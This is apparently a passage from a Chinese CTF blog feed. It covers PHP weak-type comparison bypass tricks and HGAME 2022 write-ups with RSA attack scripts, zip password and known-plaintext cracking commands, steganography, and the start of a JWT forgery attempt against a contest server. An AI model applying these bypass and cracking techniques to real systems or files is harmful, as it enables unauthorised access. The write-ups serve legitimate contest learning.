YesYesYes，但值得注意的是并不能覆盖定义原有的类，在刚才的例子中类的名字分别为 Fl4g 和 Flag，重名将会报错。 参考链接：https://www.kancloud.cn/nickbai/php7/content/4.5include-require.md 在 allow_url_include 参数开启的情况下允许解析 PHP 伪协议。 __halt_compiler 用于中断编译器的执行，在 Phar 中则以 __HALT_COMPILER(); 来结尾。 应用场景：发现无法闭合右标签且后面会导致编译错误时可用。 弱类型比较（==） 强类型，就是强制数据类型定义。也就是说，一旦变量被指定了某个数据类型，如果不经过强制类型转换，那么它永远都是这个数据类型。 弱类型，对数据类型要求不严格，可以让数据类型随意互相转换，利用这些特性，我们可以对一些条件进行绕过。 放一段大佬的 fuzz 代码： 123456789101112131415161718&lt;?phpfunction fuzz() &#123; $a = [true, false, 1, 0, -1, &quot;1&quot;, &quot;0&quot;, &quot;-1&quot;, NULL, array(), &quot;Array&quot;, &quot;null&quot;, &quot;true&quot;, &quot;false&quot;, &quot;&quot;, 0e123, &quot;0e123&quot;, &quot;0e0&quot;, 0e0, 9e999, INF, &quot;9e999&quot;, &quot;INF&quot;, -9e99, &quot;-0e0&quot;, -0e0]; for ($i = 0; $i &lt; sizeof($a); $i ++) &#123; $t = (string)$a[$i]; for ($j = 0; $j &lt; sizeof($a); $j ++) &#123; if($t !== $a[$j] &amp;&amp; md5($t) === md5($a[$j]) &amp;&amp; $t != $a[$j]) &#123; // 这里可以写一些题目里的条件，在这里实际上输出全是 INF echo &quot;--------\\n&quot;; echo &quot;pos:&quot;.$i.&quot;\\n&quot;; var_dump($a[$i]); echo &quot;pos:&quot;.$j.&quot;\\n&quot;; var_dump($a[$j]); &#125; &#125; &#125;&#125;fuzz(); 值得一提的是，switch 也是弱类型比较的。 1234567891011121314&lt;?php$a = &#x27;1e0&#x27;;switch ($a) &#123; case 1: echo &quot;1&quot;; break; case 2: echo &quot;2&quot;; break; default: echo &quot;default&quot;; break;&#125;// output: 1 字符串和数字比较 在 PHP 中，一个字符串可能被解析成两种类型：普通的字符串或者是数字字符串，值得注意的是，在 PHP8.x 中只有形如 &lt;str1&gt;e&lt;str2&gt; 的字符串只有 &lt;str1&gt; 和 &lt;str2&gt; 全为数字时才会被解析成数字字符串，而 PHP5.x 以及 PHP7.x 中只要以数字开头都可。 12345&lt;?phpvar_dump(&quot;1e5&quot; == 100000); // bool(true)var_dump(&quot;2a&quot; == 2);// PHP5.x PHP7.x =&gt; bool(true)// PHP8.x =&gt; bool(false) 普通字符串和数字比较，字符串会被转换成数字 $0$。 该特性只在 PHP 5.x 和 PHP 7.x 上生效。 举个例子： 12&lt;?phpvar_dump(&quot;str&quot; == 0); // bool(true) 以下示例来自官方文档，可以看到存在精度误差。 12345678$foo = 1 + &quot;10.5&quot;; // $foo 是 float (11.5)$foo = 1 + &quot;-1.3e3&quot;; // $foo 是 float (-1299)$foo = 1 + &quot;bob-1.3e3&quot;; // PHP 8.0.0 起产生 TypeError；在此之前 $foo 是 integer (1)$foo = 1 + &quot;bob3&quot;; // PHP 8.0.0 起产生 TypeError；在此之前 $foo 是 integer (1)$foo = 1 + &quot;10 Small Pigs&quot;; // PHP 8.0.0 起，$foo 是 integer (11)，并且产生 E_WARNING；在此之前产生 E_NOTICE$foo = 4 + &quot;10.2 Little Piggies&quot;; // PHP 8.0.0 起，$foo 是 float (14.2)，并且产生 E_WARNING；在此之前产生 E_NOTICE$foo = &quot;10.0 pigs &quot; + 1; // PHP 8.0.0 起，$foo 是 float (11)，并且产生 E_WARNING；在此之前产生 E_NOTICE$foo = &quot;10.0 pigs &quot; + 1.0; // PHP 8.0.0 起，$foo 是 float (11)，并且产生 E_WARNING；在此之前产生 E_NOTICE 特殊的，在 PHP 5.x，“0x” 开头的字符串能被解析成 16 进制的数字。 1234var_dump(0x123); // int(291)var_dump((int)&#x27;0x123&#x27;); // int(0)var_dump(&#x27;0x123&#x27; == 0x123); // bool(true)var_dump(&#x27;0x123&#x27; == 291); // bool(true) 但是显而易见的，这种解析方法存在歧义，比如第二个也可以被解析成 0，所以才会被弃用的吧。 字符串和字符串比较 字符串之间的比较有个很有意思的点，那就是如果字符串本身如果不相等的话，解释器会尝试把它们转换为数字字符串再进行比较。 举个例子： 1234var_dump(&quot;1e5&quot; == &quot;100000&quot;); // bool(true)var_dump(&quot;1e5&quot; == &quot;10e4&quot;); // bool(true)var_dump(&quot;1e5&quot; == &quot;1e5a&quot;); // bool(false)var_dump(&quot;0e12345&quot; == &quot;0e67890&quot;); // bool(true) 利用这一点，我们可以让一些字符串函数的返回值以 0e 开头来搞点事情，详细的放在了[函数篇中的字符串函数]中。 bool 类型和字符串比较 bool 类型的 true 可以和任意非空、解析后非零字符串相等，false 则反之。 举个例子： 1234var_dump(&#x27;0&#x27; == true); // bool(false)var_dump(&#x27;&#x27; == true); // bool(false)var_dump(&#x27;0a&#x27; == true); // bool(true)var_dump(&#x27;a&#x27; == true); // bool(true) bool 类型和数字比较 bool 类型的 true 可以和任意非零数字相等，反之亦然。 举个例子： 1234var_dump(0 == true); // bool(false)var_dump(1 == true); // bool(true)var_dump(1.0 == true); // bool(true)var_dump((1 - 1) == true); // bool(false)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://sxyugao.top/categories/CTF/Web/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://sxyugao.top/tags/PHP/"}]},{"title":"HGAME 2022 Writeup - Week2","slug":"HGAME-2022-Writeup-Week2","date":"2022-02-03T14:17:25.000Z","updated":"2022-02-23T04:02:38.179Z","comments":true,"path":"p/4a7063b5.html","permalink":"https://sxyugao.top/p/4a7063b5.html","excerpt":"HGAME 2022 第二周部分题的 Writeup。 第二周的难度上升了不少，而且遇到了春节，所以就没做多少。。","text":"HGAME 2022 第二周部分题的 Writeup。 第二周的难度上升了不少，而且遇到了春节，所以就没做多少。。 CRYPTO RSA Attack 拿到数据，发现 $n$ 这么小，直接去在线网站分解得到 $p$ 和 $q$，然后直接解密即可。 123456789101112131415import gmpy2import libnumdef Decrypt(e, p, q, c): f = (p - 1) * (q - 1) d = gmpy2.invert(e, f) n = p * q m = gmpy2.powmod(c, d, n) return libnum.n2s(int(m))e = 65537p = 715800347513314032483037q = 978782023871716954857211c = 122622425510870177715177368049049966519567512708print(Decrypt(e, p, q, c)) 拿到 flag：hgame&#123;SHorTesT!fLAg&#125; RSA Attack 2 分成了三个子问题，而 task.py 告诉我们了加密过程。 task1 注意到 $n1$ 和 $n2$ 是不互质的，且都是两个质数相乘，所以取最大公因数即可得到 $q$，然后得到 $p$ 即可，注意 Python 里的整数除法是 // 不是 /，在这里坑了好久。 123456789def task1(): e = 65537 n1 = 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553 c1 = 965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479 n2 = 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363 c2 = 11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090 q = gmpy2.gcdext(n1, n2)[0] p = n1 // q return Decrypt(e, p, q, c1) task2 注意到 $e$ 非常的小，而 RSA 加密是 $m^e \\equiv c \\pmod n$，即 $m^e=n \\times k + c,\\ k \\in Z$，$e$ 很小而 $n$ 很大意味着我们可以枚举 $k$ 来暴力得到 $m$。 12345678def task2(): e = 7 n = 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537 c = 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625 for k in range(200000000): res = gmpy2.iroot(c + n * k, e) if (res[1] == 1): return libnum.n2s(int(res[0])) task3 注意到两次 RSA 过程中的 $n$ 和 $m$ 是一样的。 $$ m^{e1} \\equiv c1 \\pmod n \\\\ m^{e2} \\equiv c2 \\pmod n $$ 而 $e1$ 和 $e2$ 都是质数，所以有 $gcd(e1,e2)=1$。 根据扩展欧几里得算法，存在 $e1 \\times s1 + e2 \\times s2 = gcd(e1,e2)$ 根据以上式子对 $m$ 进行推导： $$ \\begin{aligned} m &= m^{e1 \\times s1 + e2 \\times s2} \\\\ &= (m^{e1})^{s1} + (m^{e2})^{s2} \\\\ &\\equiv c1^{s1} + c2^{s2} \\pmod n \\\\ \\end{aligned} $$ 所以用扩展欧几里得算法求出 $s1$ 和 $s2$ 即可。 1234567891011121314151617def task3(): n = 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729 e1 = 2519901323 c1 = 3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870 e2 = 3676335737 c2 = 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861 s = gmpy2.gcdext(e1, e2) s1 = s[1] s2 = s[2] if (s1 &lt; 0): s1 = -s1 c1 = gmpy2.invert(c1, n) if s2 &lt; 0: s2 = -s2 c2 = gmpy2.invert(c2, n) m = pow(c1, s1, n) * pow(c2, s2, n) % n return libnum.n2s(int(m)) 得到 flag：hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125; REVERSE xD MAZE 直接扔到 IDA 里，反编译后发现逻辑类似在一维数轴上跳跃，问怎么样能 28 步全在特定的点上。 声明了一个大小为 4096 的数组，值为 32 则该点可以走，35 则不行。 写了个 DFS 来跑 flag： 1234567891011121314151617181920212223242526272829303132333435#include &lt;cstdio&gt;#include &lt;iostream&gt;using namespace std;int data[4096];void db(int n, int x) &#123; static int t = 0; for (int i = 0; i &lt; n; i++) data[t + i] = x; t += n;&#125;int d[] = &#123;512, 64, 8, 1&#125;;char flag[30];bool dfs(int now, int step) &#123; if (now &gt;= 4096) return 0; if (data[now] != 32) return 0; if (step &gt;= 28) return 1; bool f = 0; for (int i = 0; i &lt; 4; i++) &#123; flag[step] = &#x27;0&#x27; + i; f |= dfs(now + d[i], step + 1); if (f) break; &#125; return f;&#125;int main() &#123; db(2, 32), db(63, 35), db(1, 32), db(7, 35), db(1, 32), db(511, 35); db(1, 32), db(63, 35), db(1, 32), db(63, 35), db(2, 32), db(511, 35); db(2, 32), db(63, 35), db(1, 32), db(7, 35), db(1, 32), db(511, 35); db(2, 32), db(7, 35), db(1, 32), db(511, 35), db(2, 32); db(7, 35), db(1, 32), db(7, 35), db(1, 32), db(7, 35), db(1, 32), db(7, 35); db(2, 32), db(63, 35), db(1, 32), db(511, 35), db(1, 32), db(511, 35); db(2, 32), db(511, 35), db(1, 32), db(63, 35), db(1, 32), db(63, 35); db(1, 32); dfs(0, 0); printf(&quot;hgame&#123;%s&#125;&quot;, flag);&#125; 拿到 flag：hgame&#123;3120113031203203222231003011&#125; WEB webpack-engine 开始点按钮玩，喜闻乐见的上当了环节 然后直奔源码，发现没关 source map，找到了 Fl4g_1s_her3.vue 里面发现 YUdkaGJXVjdSREJ1ZEY5bU1ISTVaWFJmTWw5RGJFOXpNMTlUTUhWeVkyVmZiVUJ3ZlE9PQo= BASE64 解密一次得到 aGdhbWV7RDBudF9mMHI5ZXRfMl9DbE9zM19TMHVyY2VfbUBwfQ== 继续 BASE64 解密就拿到 flag。 得到 flag：hgame&#123;D0nt_f0r9et_2_ClOs3_S0urce_m@p&#125; To be continued…","categories":[{"name":"CTF","slug":"CTF","permalink":"https://sxyugao.top/categories/CTF/"},{"name":"HGAME","slug":"CTF/HGAME","permalink":"https://sxyugao.top/categories/CTF/HGAME/"}],"tags":[{"name":"HGAME","slug":"HGAME","permalink":"https://sxyugao.top/tags/HGAME/"}]},{"title":"HGAME 2022 Writeup - Week1","slug":"HGAME-2022-Writeup-Week1","date":"2022-01-27T16:08:17.000Z","updated":"2022-02-23T03:59:17.169Z","comments":true,"path":"p/d379320f.html","permalink":"https://sxyugao.top/p/d379320f.html","excerpt":"HGAME 2022 第一周部分题的 Writeup。 小插曲，作者在打比赛的时候忘记截止时间少交了一个 flag，血亏 150 分 QAQ。","text":"HGAME 2022 第一周部分题的 Writeup。 小插曲，作者在打比赛的时候忘记截止时间少交了一个 flag，血亏 150 分 QAQ。 CRYPTO Dancing Line 拿到图片，发现是一条折线，一开始没啥思路。 但仔细思考发现线横向只会向右，纵向只会向下，想到了什么？二进制！其实是受到校内比赛的启发 使用 PS 打开，放大后发现相邻两个黑方格之间正好相差 7 个蓝方格，想到了什么？ASCII 码！ 再结合 HGAME 的 flag 格式：hgame&#123;xxx&#125;，我们先拿到 h 的 ASCII 码，并将其转为二进制 1101000，再去对应找规律。 猜测是在折角处改变 0/1 状态，进行验证，发现前两段正好是 hg，写了个 Python 脚本： 1234567891011121314151617181920212223242526from PIL import Imageim = Image.open(&#x27;./Dancing Line.bmp&#x27;)n = im.size[0]m = im.size[1]res = 0cur = Falseflag = &quot;&quot;for j in range(m): for i in range(n): x = im.getpixel((i, j)) if (x == (0, 0, 0)): if ((i, j) != (0, 0)): flag += chr(res) res = 0 cur = False continue if (x == (255, 255, 255)): continue if (i - 1 &lt; 0 or i + 1 &gt;= n or j - 1 &lt; 0 or j + 1 &gt;= m): cur = not cur elif ((im.getpixel((i - 1, j)) != im.getpixel((i + 1, j))) and (im.getpixel((i, j - 1)) != im.getpixel((i, j + 1)))): cur = not cur # 转折意味着上下和左右均不相同或是超出边界 # 复杂度比较高，本来可以沿着线走，但是懒得写了（ res = res * 2 + curprint(flag) flag：hgame&#123;Danc1ng_L1ne_15_fun,_15n't_1t?&#125; Easy RSA 送分题，没啥好说的，RSA 的常规解密过程。 Python 脚本： 1234567891011121314import gmpy2def Decrypt(e, p, q, c): f = (p - 1) * (q - 1) d = gmpy2.invert(e, f) n = p * q m = gmpy2.powmod(c, d, n) return chr(m)a = [(12433, 149, 197, 104), (8147, 131, 167, 6633), (10687, 211, 197, 35594), (19681, 131, 211, 15710), (33577, 251, 211, 38798), (30241, 157, 251, 35973), (293, 211, 157, 31548), (26459, 179, 149, 4778), (27479, 149, 223, 32728), (9029, 223, 137, 20696), (4649, 149, 151, 13418), (11783, 223, 251, 14239), (13537, 179, 137, 11702), (3835, 167, 139, 20051), (30983, 149, 227, 23928), (17581, 157, 131, 5855), (35381, 223, 179, 37774), (2357, 151, 223, 1849), (22649, 211, 229, 7348), (1151, 179, 223, 17982), (8431, 251, 163, 30226), (38501, 193, 211, 30559), (14549, 211, 151, 21143), (24781, 239, 241, 45604), (8051, 179, 131, 7994), (863, 181, 131, 11493), (1117, 239, 157, 12579), (7561, 149, 199, 8960), (19813, 239, 229, 53463), (4943, 131, 157, 14606), (29077, 191, 181, 33446), (18583, 211, 163, 31800), (30643, 173, 191, 27293), (11617, 223, 251, 13448), (19051, 191, 151, 21676), (18367, 179, 157, 14139), (18861, 149, 191, 5139), (9581, 211, 193, 25595)]flag = &quot;&quot;;for x in a: flag += Decrypt(x[0], x[1], x[2], x[3])print(flag) flag：hgame&#123;L00ks_l1ke_y0u've_mastered_RS4!&#125; English Novel 下载下来的文件夹里给了加密方法 encrypt.py，算法非常简单，就是用 key 对 data 进行了一个移位，而移位是模 26 意义下的，这就意味着如果知道原文和密文，我们可以暴力枚举密钥，每一位的复杂度是 $O(26)$。 接下来的问题是找原文对应的密文是什么了，而这些文件分别在 original 和 encrypt 文件夹下，但是被打乱了顺序。注意到加密对于非字符是跳过的，且不改变大小写，所以我们可以根据这两个条件来写脚本判断是否对应。 然后值得一提的是加密过程和密钥长度无关，所以只需要枚举 flag.enc 文件长度的密钥就行，时间复杂度 $O(n \\times n + encrypted_len \\times n \\times 26)$。脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445encrypted = &quot;klsyf&#123;W0_j0v_ca0z_&#x27;Ks0ao-bln1qstxp_juqfqy&#x27;?&#125;&quot;encrypted_len = len(encrypted)a = [[0 for j in range(410)] for i in range(encrypted_len)]for i in range(410): s1 = open(f&#x27;./original/part&#123;i&#125;.txt&#x27;).read() for j in range(410): s2 = open(f&#x27;./encrypt/part&#123;j&#125;.txt&#x27;).read() l = len(s1) if (l != len(s2)): continue cur = 1 for k in range(l): if (s1[k].isupper()): if (not (s2[k].isupper())): cur = 0 elif (s1[k].islower()): if (not (s2[k].islower())): cur = 0 elif (s1[k] != s2[k]): cur = 0 if (cur == 0): break if (cur == 1): for k in range(encrypted_len): if s1[k].isupper(): a[k][i] = (ord(s1[k]) - ord(&#x27;A&#x27;), ord(s2[k]) - ord(&#x27;A&#x27;)) elif s1[k].islower(): a[k][i] = (ord(s1[k]) - ord(&#x27;a&#x27;), ord(s2[k]) - ord(&#x27;a&#x27;)) else: a[k][i] = (-1, -1) breakflag = &quot;&quot;for i in range(encrypted_len): if (not encrypted[i].isupper() and not encrypted[i].islower()): flag += encrypted[i] continue for key in range(26): cur = 1 for j in range(410): if (a[i][j][0] &lt; 0): continue if ((a[i][j][0] + key) % 26 != a[i][j][1]): cur = 0 break if (cur == 1): if (encrypted[i].isupper()): flag += chr(((ord(encrypted[i]) - ord(&#x27;A&#x27;) - key) % 26 + 26) % 26 + ord(&#x27;A&#x27;)) else: flag += chr(((ord(encrypted[i]) - ord(&#x27;a&#x27;) - key) % 26 + 26) % 26 + ord(&#x27;a&#x27;)) breakprint(flag) flag：hgame&#123;D0_y0u_kn0w_'Kn0wn-pla1ntext_attack'?&#125; Iot 饭卡的uno 硬件啥也不会，但是把 .hex 文件扔进 IDA 能看见这个： 12seg000:000005BE db 68h ; hseg000:000005BF aGameF1rst5tep0 db &#x27;game&#123;F1rst_5tep_0F_IOT&#125;&#x27;,0 flag：hgame&#123;F1rst_5tep_0F_IOT&#125; 正解就等官方 wp 吧。。 MISC 欢迎欢迎！热烈欢迎！ 送分题，照着题目做就行，flag 都没记录下来（ 这个压缩包有点麻烦 下载下来的文件注释告诉我们 Pure numeric passwords within 6 digits are not safe!。 意思就是让我们爆破密码，用 fcrackzip 暴力破解出密码是 483279。 解压后里面给了我们一个字典文件 password-note.txt，有个 README.txt 提示 I don’t know if it’s a good idea to write down all the passwords. 然后发现 fcrackzip 的字典模式不能用，好像是把自己目录下的 README 当成字典了，也不会修，尝试编译了半天没成功，希望有大佬能教教我。 用 ARCHPR 跑字典后得到密码是 &amp;-`;qpCKliw2yTR\\。 解压后又有一个压缩包，提示 If you don’t like to spend time compressing files, just stores them.。 一开始以为这段话意思是没压缩藏在文件里了，尝试 binwalk，发现啥也没有。 仔细观察发现这段话刚好 68 字节，而压缩包里的 README.txt 原始大小也是 68 字节！更关键的是，CRC32 也相同！ 于是考虑明文攻击。一开始试了好久一直不行，然后 SU 的师傅推荐了 rbkcrack，论工具的重要性（ 1./rbkcrack.exe -C flag.zip -P README.zip -a 拿到 keys： 060fd5e1 d1f696b7 12655d8d 再用 keys 去解压压缩包： 1./rbkcrack.exe -C flag.zip -c flag.jpg -k 060fd5e1 d1f696b7 12655d8d -d flag.jpg 拿到 flag.jpg，但是还没结束，图片内容不是 flag，使用 binwalk 发现里面藏着一个压缩包，把压缩包提取出来。 发现加密了，但是又没提示了。。思考了半天，想到压缩包的考点也就这么几个，文件内容决定了显然不是 CRC 爆破，那么只能是伪加密了。 把压缩包的两个压缩源文件数据区和压缩源文件目录区的加密标识 09 00 改成 00 00 即可，拿到最终的 flag.jpg。 flag：hgame&#123;W0w!_y0U_Kn0w_z1p_3ncrYpt!&#125; 好康的流量 给了一个流量包，用 Wireshark 打开看看，发现是一次邮件过程，里面放了一个图片附件。 流量包看上去没啥东西，去把图片还原出来吧。 用 binwalk 扫到了一个 .zlib 文件出来，被误导了半天。后来想到 binwalk 只检测文件头，文件里可能有数据类似 zlib 文件头被错误地检测出来了。把前面的数据提取出来，果然发现图片失效了，排除附加文件的可能。 看来只能从文件本身入手了，用 PS 放大，发现图片左上角有一个类似条形码的东西，但是我啥也不会，就拿 PS 先加滤镜，使用锐化，参数怎么清楚怎么来，然后手绘，大概半夜画到凌晨 3:40，得到这么一张图： 还是老办法，先生成了 hgame&#123; 的二维码，发现前面对上了！但是扫出来是 hgame&#123;ez_1mg_，好家伙只有一半，又没啥思路了。 去搜索了图片隐写的方式，尝试搜索原图来看是否存在数字水印，但是只找到了完整的图片，而这张只是那张图的稿子。但我知道了这张图是游戏王，牌佬出题人夹带私货属于是 没啥思路就拿眼睛瞪呗，用 PS 放大用取色器一个像素一个像素仔细观察，感觉最左边竖列颜色有问题，猜测也是有隐写，得知了 Stegsolve 这个工具，用它选择 RGB 的最低位，LSB，按竖列解析，获得这么一个文件： 1234567891011121314151617181920212223242526272829303153746567346e3067 72617068797d5374 Steg4n0g raphy&#125;St6567346e30677261 7068797d53746567 eg4n0gra phy&#125;Steg346e306772617068 797d53746567346e 4n0graph y&#125;Steg4n306772617068797d 53746567346e3067 0graphy&#125; Steg4n0g72617068797d5374 6567346e30677261 raphy&#125;St eg4n0gra7068797d53746567 346e306772617068 phy&#125;Steg 4n0graph797d53746567346e 306772617068797d y&#125;Steg4n 0graphy&#125;53746567346e3067 72617068797d5374 Steg4n0g raphy&#125;St6567346e30677261 7068797d53746567 eg4n0gra phy&#125;Steg346e306772617068 797d53746567346e 4n0graph y&#125;Steg4n306772617068797d 53746567346e3067 0graphy&#125; Steg4n0g72617068797d5374 6567346e30677261 raphy&#125;St eg4n0gra7068797d53746567 346e306772617068 phy&#125;Steg 4n0graph797d53746567346e 306772617068797d y&#125;Steg4n 0graphy&#125;53746567346e3067 72617068797d5374 Steg4n0g raphy&#125;St6567346e30677261 7068797d53746567 eg4n0gra phy&#125;Steg346e306772617068 797d53746567346e 4n0graph y&#125;Steg4n306772617068797d 53746567346e3067 0graphy&#125; Steg4n0g72617068797d5374 6567346e30677261 raphy&#125;St eg4n0gra7068797d53746567 346e306772617068 phy&#125;Steg 4n0graph797d53746567346e 306772617068797d y&#125;Steg4n 0graphy&#125;53746567346e3067 72617068797d5374 Steg4n0g raphy&#125;St6567346e30677261 7068797d53746567 eg4n0gra phy&#125;Steg346e306772617068 797d53746567346e 4n0graph y&#125;Steg4n306772617068797d 53746567346e3067 0graphy&#125; Steg4n0g72617068797d5374 6567346e30677261 raphy&#125;St eg4n0gra7068797fffffffff fffffffffb24db6d phy.... .....$.mb6db6db6ac3fffff fffffe6052398800 ..m..?.. ...`R9..0032967fffffffdb 6db6db6db6db6db6 .2..... m..m..m.db6db6db6db6db6d b7e40096decf503f .m..m..m ......P?........ 后面都是无意义乱码了，再与之前的到的前半部分拼接得到 flag：hgame&#123;ez_1mg_Steg4n0graphy&#125; P.S. 也是得知这个工具后才知道左上角的条形码可以通过 Stegsolve 的通道来看，直接秒出，选择 Green Plane 2 即可。可恶，白画了 3 个多小时 PS，TAT！论工具的重要性。 群青(其实是幽灵东京） 下载下来的音频先试听一会，发现低音区好像被截了，绝对有隐写（废话）。 拿 Audacity 看看频谱，发现字符串 Yoasobi，但是不是 flag。 然后再用 Silenteye 对文件进行解密，使用 AES256，密钥就用频谱得到的字符串 Yoasobi。 解出来一个 URL：https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/S_S_T_V.wav 下载下来是一个非常刺耳的音频，拿文件名去网上搜索得知还有 SSTV 这东西，介绍就自己去看百科吧。 P.S. 国际空间站也传 SSTV 格式的视频，大佬可以自制天线接收解析（ 但这格式也太小众了，网上还没啥软件能解析的，一搜全是怎么编码的。我终于在中国业余无线电论坛上找到有人推荐了 Black Cat SSTV。 但是直接外放麦克风的环境噪声比较大，只能看见里面有个二维码，并不能识别出来，好巧不巧的是，“Decode Audio File…” 选项会导致程序崩溃（已邮件反馈 bug）。 只能使用虚拟设备了，安装 VBCABLE，然后 Sound Input 选择 CABL Output，播放音频即可。 就是不知道为什么是歪的，不过不影响结果 扫码出来 flag：hgame&#123;1_c4n_5ee_the_wav&#125; P.S. 图片右边好像是异格斯卡蒂，看来 MISC 出题人成分复杂啊（ PWN test_your_nc PWN 啥也不会，就只会个 1 分的送分题。 连接以后直接 ls 发现有个 flag 文件，直接 cat 就行。 环境太卡了，flag 也忘记保存了。 REVERSE easyasm 这个文件不一般啊，是 DOS 的可执行文件，直接以文本格式打开发现有个 hgame&#123;Fill_in_your_flag&#125;，但这个显然不是 flag。 把文件扔进 IDA 里去，直接反汇编发现不兼容 16 位的代码。只能自己看了，发现两个不认识的寄存器 AL 和 AH，搜了一下资料。 AL，AH 合并起来是 AX，其中，AX 是一个 16 位寄存器，AH 就是 AX 的高字节（高 8 位），AL 是 AX 的低字节（低 8 位）。 大致看了一下，代码是把读入的数据放到 AL，把 AL 左移 4 位存到一个地方，再把 AL 右移 4 位存到一个地方，再把它们相加的结果异或 0x17，再与一个数组的数据进行比较。 前面说到 AL 是一个八位的寄存器，所以前面的操作相当于是把 AL 的高 4 位和低 4 位对调之后再异或 0x17。 直接通过逆向得到的数组进行反推，代码如下： 1234567891011#include &lt;cstdio&gt;int main() &#123; int s[28] = &#123;0x91, 0x61, 0x01, 0xC1, 0x41, 0xA0, 0x60, 0x41, 0xD1, 0x21, 0x14, 0xC1, 0x41, 0xE2, 0x50, 0xE1, 0xE2, 0x54, 0x20, 0xC1, 0xE2, 0x60, 0x14, 0x30, 0xD1, 0x51, 0xC0, 0x17&#125;; for (int i = 0; i &lt; 28; i++) &#123; s[i] = s[i] ^ 0x17; s[i] = (s[i] &gt;&gt; 4) + (s[i] &lt;&lt; 4); &#125; for (int i = 0; i &lt; 28; i++) putchar(s[i]);&#125; 拿到 flag：hgame&#123;welc0me_to_4sm_w0rld&#125; WEB easy_auth 题目要我们拿到管理员的 to_do，先发现 admin 无法注册，得知管理员账号，然后注册了一个用户名是 2333，密码是 2333 的用户，登录后随便试了一会，了解一下 API。 一开始以为是什么 SQL 注入，但是毫无头绪，翻看 JS 的时候发现每次操作会传一个 token，而且格式非常特殊，就上午搜了一下，得知 JWT 这玩意。老规矩，不知道的请移步百科。还知道了一个好用的工具网站： https://jwt.io/ 发现代码中会把这个 token 储存在 localStorage 里，就直接 localStorage.getItem('token'); 拿到 token（为了清晰一点，我按照 JWT 的格式分为 3 段）： 123eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJJRCI6MTU3OCwiVXNlck5hbWUiOiIyMzMzIiwiUGhvbmUiOiIiLCJFbWFpbCI6IiIsImV4cCI6MTY0Mjk5MzM0MiwiaXNzIjoiTUpjbG91ZHMifQ.AMrgcCQaMfJwPE_g9KIqC2rPLXU6RVt6-xxv81H3bN4 用工具网站解析得到： 123456789101112&#123; &quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;&#125;&#123; &quot;ID&quot;: 1578, &quot;UserName&quot;: &quot;2333&quot;, &quot;Phone&quot;: &quot;&quot;, &quot;Email&quot;: &quot;&quot;, &quot;exp&quot;: 1642993342, &quot;iss&quot;: &quot;MJclouds&quot;&#125; 网上搜索到方法有加密算法替换为 None 和密钥爆破，我直接对目标 API http://whatadminisdoingwhat.mjclouds.com/v1/todo/list 